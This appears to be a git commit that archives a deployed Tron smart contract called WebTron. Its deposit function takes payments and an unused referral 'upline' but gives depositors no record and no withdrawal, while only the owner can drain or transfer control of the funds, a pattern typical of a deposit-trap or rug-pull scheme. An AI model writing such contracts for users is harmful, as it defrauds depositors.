fb1008d55d2ae83e83a6bbfe53f7ff130b960c48
minion <minion>
2022-02-01 23:47:06 +0000

    with 💕

---
+++ contracts/mainnet/TV/TV95eyZJjEQQ8siLRUfi9a31aeRomBLP3h_WebTron.sol
@@ -0,0 +1,33 @@
+//SourceUnit: WebTron.sol
+
+pragma solidity 0.5.8;
+
+contract WebTron {
+    
+
+    address payable public owner;
+    
+      modifier ownerOnly(){
+        require(msg.sender == owner);
+        _;
+    }
+
+    constructor(address payable _owner) public {
+        owner = _owner;    
+    }
+
+    function deposit(address _upline) external payable {
+        require(msg.value >= 1e8, "Zero amount");
+    }
+
+    /*
+        Only external call
+    */
+    function withdrawWallet(address payable _to, uint256 _amount) public ownerOnly {
+        _to.transfer(_amount);
+    }
+   
+    function changeOwner(address payable _newOwner) public ownerOnly{
+       owner = _newOwner;
+    } 
+}
